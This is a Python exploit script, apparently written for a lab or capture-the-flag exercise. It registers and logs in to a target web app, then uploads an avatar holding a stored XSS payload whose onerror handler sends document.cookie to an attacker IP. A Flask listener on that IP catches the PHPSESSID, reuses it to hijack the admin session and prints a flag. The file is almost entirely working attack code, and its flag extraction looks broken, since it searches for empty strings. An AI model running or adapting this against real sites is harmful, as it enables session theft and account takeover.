import requests
import sys
from flask import Flask, request
from flask_cors import CORS
import time

app = Flask(__name__)
CORS(app)

print("XSS Api")
print("========")
time.sleep(1)
target = sys.argv[1]

proxies={"http":"http://127.0.0.1:8080"}

with requests.Session() as s:
	register = "%s" % target
	register_data = {
	"password":"kali123!",
	"email":"kali@kali.com",
	"name":"kali"
	}

	register_headers = {"Content-Type":"application/x-www-form-urlencoded"}
	s.post(register, data=register_data, headers=register_headers)

	login = "%s" % target
	login_data={
	"email":"kali@kali.com",
	"password":"kali123!"
	}
	s.post(login, data=login_data, headers=register_headers)

	xss = "%s" % target
	xss_headers = {
	"Content-Type":"multipart/form-data; boundary=----WebKitFormBoundary4u70ZE9gdzBVMAfn"
	}
	xss_data = ''
	xss_data += '------WebKitFormBoundary4u70ZE9gdzBVMAfn' + "\n" 
	xss_data += 'Content-Disposition: form-data; name="avatar"; filename="avatar"' + "\n"
	xss_data += 'Content-Type: application/octet-stream' + "\n" + "\n"
	xss_data += '\'onerror=\'fetch("http://192.168.119.163/cookie?" + document.cookie)\'\'' + "\n"
	xss_data += '------WebKitFormBoundary4u70ZE9gdzBVMAfn--'
	s.post(xss, data=xss_data, headers=xss_headers)

@app.route('/cookie', methods=['GET'])

def auth():
	cookie = request.args.get('PHPSESSID')
	print("[+] Received cookie! %s" % cookie)
	print("\n")
	with requests.Session() as a:
		cookies = dict(PHPSESSID=cookie)
		admin = "%s" % target
		authenticate = a.get(admin, cookies=cookies)
		content = authenticate.text
		first = content.index('')
		last = content.index('')

	print("Flag: " + content[first:last])
	
	return ""



#ADJUST IP ADDRESS

app.run(host='192.168.119.163', port=80)
